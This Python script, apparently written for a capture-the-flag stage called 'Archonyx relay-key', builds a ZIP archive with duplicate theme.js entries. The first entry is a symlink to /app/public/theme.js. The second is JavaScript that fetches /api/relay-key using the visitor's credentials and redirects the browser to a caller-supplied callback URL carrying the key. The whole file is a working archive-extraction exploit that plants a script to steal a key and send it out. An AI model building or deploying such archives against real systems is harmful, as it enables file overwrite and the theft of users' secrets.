#!/usr/bin/env python3
"""Build the duplicate-entry archive used in the Archonyx relay-key stage."""

from __future__ import annotations

import argparse
import json
import stat
import zipfile
from pathlib import Path
from urllib.parse import urlencode, urlsplit


DEFAULT_OUTPUT = Path("relay_hijack.zip")
DEFAULT_TARGET = "/app/public/theme.js"


def callback_url(base_url: str) -> str:
    parsed = urlsplit(base_url)
    if parsed.scheme not in {"http", "https"} or not parsed.netloc:
        raise argparse.ArgumentTypeError(
            "callback must be an absolute HTTP or HTTPS URL"
        )
    return base_url


def build_archive(output: Path, target: str, callback: str) -> None:
    query_prefix = urlencode({"stage": "relay-key", "key": ""})
    callback_prefix = f"{callback}{'&' if '?' in callback else '?'}{query_prefix}"

    javascript = f"""
fetch('/api/relay-key', {{credentials: 'include'}})
  .then(response => response.json())
  .then(result => {{
    location.href =
      {json.dumps(callback_prefix)}
      + encodeURIComponent(result.data);
  }});
""".lstrip()

    with zipfile.ZipFile(output, "w") as archive:
        link = zipfile.ZipInfo("theme.js")
        link.create_system = 3
        link.external_attr = (stat.S_IFLNK | 0o777) << 16
        link.compress_type = zipfile.ZIP_STORED
        archive.writestr(link, target)

        replacement = zipfile.ZipInfo("theme.js")
        replacement.create_system = 3
        replacement.external_attr = (stat.S_IFREG | 0o600) << 16
        replacement.compress_type = zipfile.ZIP_STORED
        archive.writestr(replacement, javascript)


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description=(
            "Create the duplicate-entry ZIP used to replace Archonyx theme.js."
        )
    )
    parser.add_argument(
        "--callback",
        required=True,
        type=callback_url,
        help="Callback URL that receives the recovered relay key.",
    )
    parser.add_argument(
        "--output",
        type=Path,
        default=DEFAULT_OUTPUT,
        help=f"Output archive path. Default: {DEFAULT_OUTPUT}",
    )
    parser.add_argument(
        "--target",
        default=DEFAULT_TARGET,
        help=f"Symlink target. Default: {DEFAULT_TARGET}",
    )
    return parser.parse_args()


def main() -> None:
    args = parse_args()
    build_archive(args.output, args.target, args.callback)
    print(f"created={args.output}")


if __name__ == "__main__":
    main()
